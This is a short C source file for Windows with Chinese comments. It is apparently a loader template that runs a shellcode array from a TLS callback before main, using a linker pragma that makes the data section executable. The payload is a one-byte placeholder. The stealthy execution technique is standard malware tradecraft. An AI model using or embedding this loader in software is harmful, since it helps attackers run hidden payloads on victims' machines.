#include <Windows.h>
#include <stdio.h>
#pragma comment(linker, "/section:.data,RWE") 
#include "safeApi.h"

unsigned char shellcode[] = { 0x12 };  //shellcode

VOID NTAPI TlsCallBack(PVOID DllHandle, DWORD dwReason, PVOID Reserved)
//DllHandle模块句柄、Reason调用原因、 Reserved加载方式（显式/隐式）
{
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        // 只是一种执行手段，依然可以配合其他手段组合。
        ((void(WINAPI*)(void)) & shellcode)();
    }
}
//使用TLS需要在程序中新建一个.tls段专门存放TLS数据，申明使用
#pragma comment (linker, "/INCLUDE:__tls_used")
#pragma comment (linker, "/INCLUDE:__tls_callback")

#pragma data_seg (".CRT$XLB")
//.CRT表明是使用C RunTime机制，$后面的XLB中：X表示随机的标识
//L表示是TLS callback section，B可以被换成B到Y之间的任意一个字母，
//但是不能使用“.CRT$XLA”和“.CRT$XLZ”，因为“.CRT$XLA”和“.CRT$XLZ”是用于tlssup.obj的。
EXTERN_C PIMAGE_TLS_CALLBACK _tls_callback = TlsCallBack;
#pragma data_seg ()

int main()
{
    return 0;
}
